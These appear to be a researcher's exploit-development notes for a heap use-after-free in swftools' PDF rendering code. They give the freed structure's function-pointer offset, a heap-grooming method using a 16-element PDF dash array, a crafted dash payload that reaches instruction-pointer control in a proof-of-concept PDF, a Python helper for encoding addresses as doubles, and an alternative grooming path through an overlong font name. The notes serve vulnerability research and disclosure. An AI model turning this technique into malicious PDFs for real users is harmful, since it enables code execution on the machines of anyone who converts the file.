In `CharOutputDev.cc:1009`:

```c
		    points[0].x, points[0].y,
		    points[1].x, points[1].y,
		    points[2].x, points[2].y,
		    points[3].x, points[3].y, action, text); 
	    
	    dev->drawlink(dev, points, action, text);  <--- Heap use after free
```

ASAN identifies at the line `dev->drawlink` a `heap-use-after-free`.

The variable is freed at `VectorGraphicOutputDev.cc:1546`:
```c
void VectorGraphicOutputDev::endTransparencyGroup(GfxState *state)
{
    dbgindent-=2;
    gfxdevice_t*r = this->device;
...
...
    free(r);
```

The freed block is 128 bytes long. But it looks like there are other freed block, so we would need to do between 2-3 allocations of 128 bytes to use the freed block.

`dev` is an structure of type `gfxdevice_t`, the 0x58 offset if the drawlink function pointer, so if we can use the freed obect and write in the 0x58 offset an address the execution will go there.

It is possible to allocate a block of 128 bytes with controlled data using a dash line.

Dash lines are explained here:
http://www.websupergoo.com/helppdfnet/source/4-examples/17-advancedgraphics.htm

After the transparency ends (and the free happens) a call to restoreState() is made at `xpdf/Gfx.cc:3862`. That function call to `VectorGraphicOutputDev::restoreState` at `VectorGraphicOutputDev.cc:908`. Then call to updateAll is made. The first thing that happens inside updateAll is a call to updateLineDash:
```c
void OutputDev::updateAll(GfxState *state) {
  updateLineDash(state);
  updateFlatness(state);
  updateLineJoin(state);
  updateLineCap(state);
  updateMiterLimit(state);
  updateLineWidth(state);
  updateStrokeAdjust(state);
  updateFillColorSpace(state);
  updateFillColor(state);
  updateStrokeColorSpace(state);
  updateStrokeColor(state);
  updateBlendMode(state);
  updateFillOpacity(state);
  updateStrokeOpacity(state);
  updateFillOverprint(state);
  updateStrokeOverprint(state);
  updateTransfer(state);
  updateFont(state);
}
```

updateLineDash code:
```c
    if(!dashLength) {
        states[statepos].dashPattern = 0;
        states[statepos].dashLength = 0;
    } else {
        double*p = (double*)malloc(dashLength*sizeof(states[statepos].dashPattern[0]));
        memcpy(p, pattern, dashLength*sizeof(states[statepos].dashPattern[0]));
        states[statepos].dashPattern = p;
        states[statepos].dashLength = dashLength;
        states[statepos].dashStart = dashStart;
    }
```

With a dashLength of 16, we will do a malloc of 128 bytes.

The content will be fill with the pattern.

A simple dash line in a pdf is this:
```
[90 30] 0
```
That has a length 2 and the patterns are 90 and 30. The pattern is a double number.

So if we use a 16 length dash line with a double number representing the hex number that we want we could control the execution when the UAF happens.

In the PoC, `full_rip_control` I am using this dash line:
```
[0 0 0 0 0 0 0 0 0 0 0 0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000807223191 0 0 0 0] 0 d
```

To know the double number we can use python:
```python
import struct
"%.800f" % struct.unpack("<d", "\x64\x63\x62\x61\x00\x00\x00\x00")[0]

Out[18]: '0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000807223189120981487309619445983000812597360278039238145770887963981026799396004774194232612278635063033486638804338723712187199395908617978017156888857779345374696167038577802087299810113601940465803928798555478351875183041384191311199211290459023474706022704900268387159437649344011731934216702924764913945652981958923784233952103818660209276895163482376551945394476636373631112525321934546877356067505078472045127922765352231619714669313873973323694316933551991388941954939032886032620'
```

It isn't completilly precise, in the PoC `full_rip_control.pdf` the rip gets the value 0x61626365. Modifying the decimals I only can get the `0x61626363`, but not the intended `0x61626364`. 

ToDo: Figure out how the conversion is done and if it is possible to control all the bytes.

OLD: Another way to use the freed block is setting the /BaseFont to a 128 bytes string length name. This name can use some encoding `#61` but it is not possible to use the NULL byte because the string used is first decoded and the duplicate with strdup at `pdf/InfoOutputDev.cc:519`:
```c
char*getFontID(GfxFont*font)
{
    Ref*ref = font->getID();
    GString*gstr = font->getName();
    char* fname = gstr==0?0:gstr->getCString();
    char buf[128];
    if(fname==0) {
        if(font->getType() == fontType3) {
            sprintf(buf, "t3font-%d-%d", ref->num, ref->gen);
        } else {
            sprintf(buf, "font-%d-%d", ref->num, ref->gen);
        }
    } else {
        sprintf(buf, "%s-%d-%d", fname, ref->num, ref->gen);
    }
    return strdup(buf);  <---Font duplicated
}
```

We need to be careful with the format string used `%s-%d-%d`, and use a font 124 bytes long.

ToDo: Why is it freed? I am not sure, it is looks like when a transparency ends the device is freed, but this device can be reuse during the rendering of another object??? 
